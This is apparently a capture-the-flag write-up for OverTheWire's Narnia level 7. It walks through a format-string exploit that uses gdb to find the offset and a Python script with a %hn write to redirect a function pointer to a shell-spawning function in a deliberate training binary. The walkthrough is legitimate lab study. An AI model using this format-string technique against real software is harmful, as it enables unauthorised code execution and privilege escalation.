# OverTheWire — Narnia Level 7 → 8

> Goal: Get narnia8 password from `narnia7`. Result: **`**********`** (hidden)
> Technique: format string (`%hn`) → redirect function pointer `ptrf` to `hackedfunction`.

---

## 1. Connection
```bash
ssh narnia7@narnia.labs.overthewire.org -p 2226
```

## 2. Source
```c
int vuln(const char *format){
    char buffer[128]; int (*ptrf)();
    printf("goodfunction() = %p\n", goodfunction);
    printf("hackedfunction() = %p\n\n", hackedfunction);
    ptrf = goodfunction;
    printf("before : ptrf() = %p (%p)\n", ptrf, &ptrf);   // prints GF, HF, &ptrf
    sleep(2);
    snprintf(buffer, sizeof buffer, format);              // BUG: format = argv[1]
    return ptrf();                                        // ptrf=hackedfunction -> shell
}
// hackedfunction: printf("Way to go!!!!"); setreuid(geteuid(),geteuid()); system("/bin/sh");
```
> ⚠️ buffer is **not printed** → you can't see `%x` output (can't find offset visually). `sleep(2)` is present.

## 3. Offset — **via gdb at snprintf stack (VERIFIED = 2)**
```bash
gdb -q -batch /narnia/narnia7 -ex 'break snprintf' -ex 'run AAAA.BBBB' -ex 'x/30wx $esp'
# 0xffffd2e8: 0x0804929d  0xffffd2fc  0x00000080  0xffffd5be
#              [ret]       [buffer]    [size=0x80]  [format]
# 0xffffd2f8: 0x080492ea  0x00000000 ...
#              [vararg1]   [vararg2 = ADDR 0xffffd2fc = BUFFER!]
```
`buffer = 0xffffd2fc`. snprintf varargs: `%1$`=[esp+16], `%2$`=[esp+20]=**buffer**.
→ Our input appears at **`%2$`** → **offset = 2**. (Not 6 as in the walkthrough.)

## 4. Writing — single `%2$hn` (high halves are EQUAL)
From program output: `GF=0x80492ea`, `HF=0x804930f` → **same upper 16 bits** (`sameHigh=True`).
`ptrf` already holds `goodfunction` → just write the **lower half**:
```
lh = hackedfunction & 0xffff         # e.g. 0x930f
payload = pack(&ptrf) + "%.{lh-4}x" + "%2$hn"   # 4 (addr) + (lh-4) = lh written -> ptrf = HF
```
> If upper halves were different, two `%hn` writes (smaller value first) would be needed.

## 5. Exploit
Read `&ptrf` from the program's output (using same-length leak: `%2$hx`, non-writing):
```python
import subprocess, struct, time, sys, re
def addrs(arg):  # parse GF, HF, &ptrf
    o = subprocess.run([b'/narnia/narnia7', arg], capture_output=True)...
gf,hf,_ = addrs(b'AAAA'); lh = hf & 0xffff
fmt  = ('%%.%dx%%2$hn'%(lh-4)).encode()
fmtx = ('%%.%dx%%2$hx'%(lh-4)).encode()        # same length, non-writing
_,_,ptrf = addrs(b'BBBB'+fmtx)                 # &ptrf  (e.g. ffffd318)
exploit = struct.pack('<I',ptrf) + fmt
# sleep(2) -> feed command ~2.8s later; env not wiped -> cat works
```
Output: `Way to go!!!!` → `uid=14008(narnia8)` → password. (Live: `GF=80492ea HF=804930f lh=930f PTRF=ffffd318`.)


## Lessons
| Topic | Note |
|-------|------|
| format string + fp | Use `%hn` to take over a function pointer |
| buffer not printed | Find offset via **gdb** (`break snprintf` + stack) → 2 |
| single write | If upper halves match, just write the lower half (`%2$hn`) |
| addresses as gift | GF/HF/&ptrf are printed → no guessing |
| `sleep(2)` | Feed command late enough |
